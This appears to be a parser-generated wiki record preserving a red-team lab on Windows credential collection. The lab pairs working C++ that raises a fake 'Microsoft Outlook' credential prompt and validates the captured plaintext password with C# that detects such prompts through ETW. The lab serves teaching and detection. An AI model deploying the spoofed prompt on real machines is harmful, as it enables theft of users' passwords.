---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Credentials Collection via CredUIPromptForCredentials

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-credentials-collection-via-creduipromptforcredentials` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/credentials-collection-via-creduipromptforcredentials.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Credentials Collection via CredUIPromptForCredentials](../../topics/offensive-security/credentials-collection-via-creduipromptforcredentials.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-credentials-collection-via-creduipromptforcredentials |
| name | Credentials Collection via CredUIPromptForCredentials |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/credentials-collection-via-creduipromptforcredentials.md |

## Preserved Source Material

````yaml
_asset_filenames:
- CredUIPromptForCredentials -detection.gif
- image (547).png
- image (548).png
- image (549).png
_body: "# Credentials Collection via CredUIPromptForCredentials\n\n## Purpose\n\nThe purpose of this lab is to twofold:\n\n\
  1. write some code that invokes Windows credential prompt, that would allow malware or an attacker to collect targeted user's\
  \ credentials once they are on the compromised machine\n2. write some ETW code that detects processes invoking credential\
  \ prompts\n\n## Stealing User Credentials\n\nIt is possible to collect user credentials with the below code:\n\n{% code\
  \ title=\"credentialsprompt.cpp\" %}\n```cpp\n#include <iostream>\n#include <Windows.h>\n#include <wincred.h>\n\n#pragma\
  \ comment(lib, \"Credui.lib\")\n\nint WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n\
  {\n\tCREDUI_INFO ci = { sizeof(ci) };\n\tstd::wstring promptCaption = L\"Microsoft Outlook\";\n\tstd::wstring promptMessage\
  \ = L\"Connecting to spotless@offense.local\";\n\tci.pszCaptionText = (PCWSTR)promptCaption.c_str();\n\tci.pszMessageText\
  \ = (PCWSTR)promptMessage.c_str();\n\n\tWCHAR username[255] = {};\n\tWCHAR password[255] = {};\n\tDWORD result = 0;\n\n\t\
  result = CredUIPromptForCredentialsW(&ci, L\".\", NULL, 5, username, 255, password, 255, FALSE, CREDUI_FLAGS_GENERIC_CREDENTIALS);\n\
  \tif (result == ERROR_SUCCESS)\n\t{\n\t\tHANDLE newToken = NULL;\n\t\tBOOL credentialsValid = FALSE;\n\n\t\tcredentialsValid\
  \ = LogonUserW(username, NULL, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newToken);\n\t\tif (credentialsValid)\n\
  \t\t{\n\t\t\t// valid credentials provided\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// invalid credentials provided\n\t\t}\n\t}\n\t\
  else if (result == ERROR_CANCELLED)\n\t{\n\t\t// no credentials provided\n\t}\n\n\treturn 0;\n}\n```\n{% endcode %}\n\n\
  {% hint style=\"warning\" %}\nAlthough in this lab I am using `CredUIPromptForCredentials` for invoking credentials prompt,\
  \ you should be using  [`CredUIPromptForWindowsCredentials`](https://docs.microsoft.com/windows/desktop/api/wincred/nf-wincred-creduipromptforwindowscredentialsa)\n\
  {% endhint %}\n\nIf we compile and run the above code, we get a credential prompt, that captures user's credentials in plain\
  \ text, which we could then save to a file or send out over the internet:\n\n![](<../../.gitbook/assets/image (547).png>)\n\
  \n{% hint style=\"info\" %}\nThe above credential prompt can also be invoked with  PowerShell cmdlet `Get-Credential`.\n\
  {% endhint %}\n\n## Detecting Credential Prompts\n\nAs a defender, one may want to know what processes are popping these\
  \ credential prompts, so that malicious ones could be detected - i.e if you are notified that suddenly some unusual process\
  \ showed a prompt, it may mean that the process is infected and the machine is compromised.\n\nDetection of programs showing\
  \ credential prompts is possible with [Event Tracing for Windows (EWT)](../../miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101.md#terminology)\
  \ - Microsoft-Windows-CredUI provider to the rescue:\n\n![](<../../.gitbook/assets/image (548).png>)\n\nLooking at the provider\
  \ Microsoft-Windows-CredUI in ETWExplorer, we can see that it can provide consumers with events for both `CredUIPromptForCredentials`\
  \ and `CredUIPromptForWindowsCredentials` invokations:\n\n![](<../../.gitbook/assets/image (549).png>)\n\nWe can create\
  \ an ETW tracing session and subscribe to events from Microsoft-Windows-CredUI provider with C# like so:\n\n{% code title=\"\
  credentialsprompt-detection.cs\" %}\n```csharp\n# based on https://github.com/zodiacon/DotNextSP2019/blob/master/SimpleConsumer/Program.cs\n\
  using Microsoft.Diagnostics.Tracing.Session;\nusing System;\nusing System.Collections.Generic;\nusing System.Diagnostics;\n\
  using System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace SimpleConsumer\n{\n    static class Programa\n\
  \    {\n        static void Main(string[] args)\n        {\n            using (var session = new TraceEventSession(\"spotless-credential-prompt\"\
  ))\n            {\n                Console.CancelKeyPress += delegate {\n                    session.Source.StopProcessing();\n\
  \                    session.Dispose();\n                };\n\n                session.EnableProvider(\"Microsoft-Windows-CredUI\"\
  , Microsoft.Diagnostics.Tracing.TraceEventLevel.Always);\n                var parser = session.Source.Dynamic;\n       \
  \         parser.All += e => {\n                    if (e.OpcodeName == \"Start\")\n                    {\n            \
  \            Console.WriteLine($\"{e.TimeStamp} > Credential Prompt detected in {Process.GetProcessById(e.ProcessID).ProcessName}.exe\
  \ (PID={e.ProcessID})\");\n                    }\n                };\n                session.Source.Process();\n      \
  \      }\n        }\n    }\n}\n```\n{% endcode %}\n\n## Demo\n\nBelow shows RogueCredentialsPrompt.exe and Powershell.exe\
  \ invoking Windows credential prompts and our simple consumer program detecting that activity:\n\n![](<../../.gitbook/assets/CredUIPromptForCredentials\
  \ -detection.gif>)\n\n## References\n\n{% embed url=\"https://ired.team/miscellaneous-reversing-forensics/etw-event-tracing-for-windows-101\"\
  \ %}\n\n{% embed url=\"https://github.com/zodiacon/DotNextSP2019/\" %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduipromptforcredentialsa\"\
  \ %}"
_relative_path: offensive-security/credential-access-and-credential-dumping/credentials-collection-via-creduipromptforcredentials.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/credentials-collection-via-creduipromptforcredentials.md
````
